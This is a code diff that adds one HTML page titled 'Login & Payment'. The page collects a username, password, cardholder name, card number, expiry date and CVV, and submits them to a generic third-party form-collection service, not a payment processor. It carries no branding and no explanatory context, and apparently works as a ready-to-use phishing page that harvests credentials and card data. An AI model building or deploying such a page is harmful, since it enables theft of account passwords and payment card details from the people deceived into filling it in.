@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Login & Payment</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    .form-box {
+      background: white;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      width: 320px;
+    }
+    .form-box h2 {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border-radius: 4px;
+      border: 1px solid #ccc;
+    }
+    .row {
+      display: flex;
+      gap: 10px;
+    }
+    .row input {
+      flex: 1;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      background: #27ae60;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      margin-top: 15px;
+    }
+    button:hover {
+      background: #219150;
+    }
+  </style>
+</head>
+<body>
+  <form class="form-box" method="POST" action="https://formspree.io/f/xwkgrwpr">
+    <h2>Login & Payment</h2>
+
+    <input type="text" name="Username" placeholder="Username" required>
+    <input type="password" name="Password" placeholder="Password" required>
+    <input type="text" name="Cardholder Name" placeholder="Cardholder Name" required>
+    <input type="text" name="Card Number" placeholder="Card Number" required>
+
+    <div class="row">
+      <input type="text" name="Exp Month" placeholder="Exp. Month" required>
+      <input type="text" name="Exp Year" placeholder="Exp. Year" required>
+    </div>
+
+    <input type="text" name="Security Code" placeholder="Security Code (CVV)" required>
+
+    <button type="submit">Send</button>
+  </form>
+</body>
+</html>
